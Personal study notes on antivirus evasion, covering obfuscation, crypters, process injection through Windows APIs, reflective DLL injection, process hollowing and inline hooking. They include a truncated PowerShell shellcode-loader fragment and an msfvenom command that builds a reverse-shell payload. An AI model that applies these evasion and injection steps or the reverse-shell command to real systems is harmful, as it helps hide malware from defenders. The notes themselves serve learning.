---
category: NULL
subjects:
  - NULL
full_form: NULL
acronym: NULL
---
## Definition

## Antivirus Evasion
### On-disk
focuses on modifying malicious files physically stored on disk to evade AV file engine detections
- Malware obfuscation
	- packer
	- obfuscator (instruction replacement for semantically equivalents, insertions of dead code, splitting and reorder of functions) (spurious instruction)
	- crypter software (cryptographically alters executable code and adds a decryption stub to restore the original code upon execution (on-memory))
	- anti-reversing
	- anti-debugging
	- vm emulation detection
Common software designed to protect intellectual property are excellent for evasion

### On-memory
avoids the disk entirely and therefore, reduces the possibility of being detected
[_In-Memory Injections_](https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process), also known as _PE Injection_

_Remote Process Memory Injection_: inject the payload into another valid PE that is not malicious
1. acquire handle to accessible process using [_OpenProcess_](https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-openprocess)
2. allocate memory in it's context ([_VirtualAllocEx_](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex))
3. write payload into the allocated memory using [_WriteProcessMemory_](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)
4. execute in a separate thread using [_CreateRemoteThread_](https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createremotethread)

_remote process memory injection_ targeting pwsh:
1. allocate unmanaged memory
2. decode the base64-encoded shellcode and transfers it into that memory
3. build a dynamic assembly that includes a method designed to run the injected payload

```powershell
$c='
[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport("msvcrt.dll")] public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
# ...
# msfvenom -p windows/shell_reverse_tcp LHOST=0.0.0.0 LPORT=443 -f psh-reflection
```

 [_Reflective DLL Injection_](https://www.andreafortuna.org/2017/12/08/what-is-reflective-dll-injection-and-how-can-be-detected/): attempts to load a DLL stored by the attacker in the process memory. Windows does not provide any API for this operation, so it must be custom made

 [_Process Hollowing_](https://ired.team/offensive-security/code-injection-process-injection/process-hollowing-and-pe-image-relocations):
 5. launch a non-malicious process in a suspended state
 6. remove the image of the process from the memory
 7. replace it with a malicious executable image
 8. resume the process

_Inline hooking_: modify memory and introduce a hook (an instruction that redirects the code execution) into a function to make it point to our malicious code. Upon execution, the regular code execution flow is resumed, appearing as if only the original code had executed

## Relevant Reading
- []()

## External Reference
[en.wikipedia.org]()
[RFCNNNN - NAME](https://datatracker.ietf.org/doc/html/rfcNNNN)
